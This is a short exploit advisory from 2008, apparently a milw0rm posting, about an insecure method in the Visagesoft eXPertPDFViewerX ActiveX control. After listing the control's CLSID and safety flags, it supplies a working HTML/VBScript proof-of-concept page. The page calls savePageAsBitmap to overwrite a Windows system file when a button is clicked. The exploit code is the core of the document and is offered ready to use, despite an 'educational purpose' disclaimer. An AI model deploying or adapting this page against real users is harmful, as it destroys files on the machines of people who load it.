@@ -1,0 +1,40 @@
+ VISAGESOFT eXPertPDFViewerX (VSPDFViewerX.ocx) INSECURE METHOD
+ SITE: http://www.visagesoft.com
+ 
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+ Author: Marco Torti
+ mail: marcotorti2[at]yahoo[dot]com
+ thanks UGIS
+################################################################################
+ FileVersion:   3.0.990.0
+ CLSID:  {BDF3E9D2-5F7A-4F4A-A914-7498C862EA6A}
+ Description: Visagesoft PDF Viewer Control
+ ProgID:        VSPDFViewer.VSPDFViewer
+ 
+  Marked as:
+  RegKey Safe for Script: False
+  RegKey Safe for Init: False
+  Implements IObjectSafety: True
+  IDisp Safe: Safe for untrusted: caller,data 
+  IPStorage Safe: Safe for untrusted: caller,data
+ 
+ Vulnerable method:
+ savePageAsBitmap(ByVal bitmapFileName  As String) As Boolean
+##################################################################################
+ Vulnerability Description:
+    The "savePageAsBitmap" method doesn't check user supplied arguments so we
+    can save/overwrite a specified file passed as argument, i don't have time, check others functions....
+ Tested on Windows XP Professional SP3 fully patched, with Internet Explorer 7
+###################################################################################
+<object classid='clsid:BDF3E9D2-5F7A-4F4A-A914-7498C862EA6A' id='target'/></object>
+<input language=VBScript onclick=launch() type=button value='start exploit'>
+<script language='vbscript'>
+Sub launch
+target.savePageAsBitmap "c:\windows\-system.ini"
+MsgBox"Exploit Completed.. file overwrite!"
+End Sub
+</script>
+###################################################################################
+
+# milw0rm.com [2008-10-29]
